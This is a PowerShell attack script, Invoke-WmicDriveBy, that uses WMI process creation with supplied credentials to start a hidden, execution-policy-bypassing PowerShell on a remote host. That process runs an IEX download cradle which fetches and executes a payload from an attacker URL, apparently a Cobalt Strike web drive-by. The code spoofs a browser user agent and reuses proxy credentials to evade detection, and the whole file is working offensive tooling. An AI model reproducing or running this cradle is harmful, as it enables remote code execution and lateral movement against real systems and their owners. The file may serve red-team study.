function Invoke-WmicDriveBy{

  <#
  .SYNOPSIS
  This script uses wmic to open a powershell process and use the IEX download cradle to execute a powershell web drive by payload.

  .DESCRIPTION 
  This function calls wmic process call create to execute the powershell command for the IEX download cradle. The cradle is used to execute a payload delivered via
  the powershell web drive by exploitation module in cobaltstrike. Wmic runs with the permissions of the current user by default.

  .EXAMPLE
  > Invoke-WmicDriveBy http://127.0.0.1/update -User test\jonny -Pass "Kg^*dksLkD$" -TARGET 192.168.1.10
  Run the script with user credentials for a specific host

  .EXAMPLE
  > Invoke-WmicDriveBy http://192.168.1.101/a 
  Run the script against the localhost with the current user credentials

  .PARAMETER User
  Specify a username  Default is the current user context. 

  .PARAMETER Pass
  Specify the password for the appropriate user

  .PARAMETER URL
  URL for the powershell web delivery. Required. 

  .PARAMETER TARGET
  Host to target. Can be a hostname, IP address, or FQDN. Default is set to localhost. 

  #>

  param(
    #Parameter assignment
    [Parameter(Mandatory = $True, Position = 0)] 
    [string]$URL,
    [Parameter(Mandatory = $False, Position = 1)] 
    [string]$User,
    [Parameter(Mandatory = $False, Position = 2)] 
    [string]$Pass,
    [Parameter(Mandatory = $False, Position = 3)] 
    [string]$TARGET = "."

  )

  #Did the user specify credentials?
  if($User -and $Pass){
    #Assign username and password if parameter is set. Run the wmic method with the specified credentials.
    Write-Verbose "Set to run with Username: $User and Password: $Pass"

    $password = convertto-securestring $Pass -asplaintext -force
    $cred = new-object -typename System.Management.Automation.PSCredential -argumentlist $User,$password

    #Set the proxy and user agent to blend in
    $powershellcmd = "`$wc = New-Object System.Net.Webclient; `$wc.Headers.Add('User-Agent','Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; AS; rv:11.0) Like Gecko'); `$wc.proxy= [System.Net.WebRequest]::DefaultWebProxy; `$wc.proxy.credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials; IEX (`$wc.downloadstring('$URL'))"
    $cmd = "powershell.exe -exec bypass -w hidden -command $powershellcmd"

    Write-Verbose "Executing `"$cmd`" on `"$Target`""
    Invoke-WmiMethod -class Win32_process -name Create -Argumentlist $cmd -Credential $cred -ComputerName $TARGET 
  }
  else{
    Write-Verbose "Username and/or password not specified. Running in current user context."
    
    #Set the proxy and user agent to blend in
    $powershellcmd = "`$wc = New-Object System.Net.Webclient; `$wc.Headers.Add('User-Agent','Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; AS; rv:11.0) Like Gecko'); `$wc.proxy= [System.Net.WebRequest]::DefaultWebProxy; `$wc.proxy.credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials; IEX (`$wc.downloadstring('$URL'))"
    $cmd = "powershell.exe -exec bypass -w hidden -command $powershellcmd"
    
    Write-Verbose "Executing `"$cmd`" on `"$Target`""
    Invoke-WmiMethod -class Win32_process -name Create -Argumentlist $cmd -ComputerName $TARGET
  }





  




}